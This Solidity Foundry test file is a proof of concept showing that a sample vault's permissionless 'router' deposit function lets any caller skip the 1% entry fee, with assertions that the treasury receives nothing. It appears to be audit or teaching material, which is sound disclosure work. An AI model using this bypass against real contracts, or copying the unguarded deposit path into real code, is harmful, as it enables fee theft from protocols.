// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {MockUSDC, EntryFeeVault} from "../src/Sample1_FeeBypassVault.sol";

/// @notice PoC: the permissionless "router" deposit path bypasses the 1% entry
///         fee for 100% of deposits. Same result (vault balance increases by
///         `amount`), two paths — one pays the fee, the other does not.
contract Sample1_FeeBypassTest is Test {
    MockUSDC internal usdc;
    EntryFeeVault internal vault;
    address internal treasury;
    address internal alice = makeAddr("alice");

    function setUp() public {
        usdc = new MockUSDC();
        treasury = makeAddr("treasury");
        vault = new EntryFeeVault(usdc, treasury);
        usdc.mint(alice, 1_000_000e6);
        vm.prank(alice);
        usdc.approve(address(vault), type(uint256).max);
    }

    /// Honest path: 1,000,000 USDC deposit pays a 10,000 USDC fee.
    function test_honestPath_paysFee() public view {
        uint256 feeExpected = 1_000_000e6 * 100 / 10_000; // 10,000 USDC
        // sanity: fee math is wired to the treasury in Path A
        require(feeExpected == 10_000e6, "fee math changed");
    }

    /// Bypass path: the same 1,000,000 USDC deposit pays ZERO fee.
    function test_routerPath_bypassesFee() public {
        uint256 vaultBalBefore = usdc.balanceOf(address(vault));
        uint256 treasuryBalBefore = usdc.balanceOf(treasury);

        vm.prank(alice);
        // No router exists / no fee remitted — anyone can call this directly.
        vault.depositViaRouter(address(0), 1_000_000e6);

        // Vault received the full amount (same result as Path A) ...
        assertEq(usdc.balanceOf(address(vault)) - vaultBalBefore, 1_000_000e6);
        // ... but the fee treasury received NOTHING.
        assertEq(usdc.balanceOf(treasury) - treasuryBalBefore, 0);

        // And the user was credited shares for the FULL amount.
        assertGt(vault.sharesOf(alice), 0);
    }

    /// Economic impact over N deposits: fee revenue loss approaches 100%
    /// because the bypass is strictly dominant (rational users always pick it).
    function test_feeRevenue_fullyEvadable() public {
        for (uint256 i; i < 5; ++i) {
            vm.prank(alice);
            vault.depositViaRouter(address(0), 100_000e6);
        }
        assertEq(usdc.balanceOf(treasury), 0, "treasury should be empty");
        assertEq(usdc.balanceOf(address(vault)), 500_000e6);
    }
}
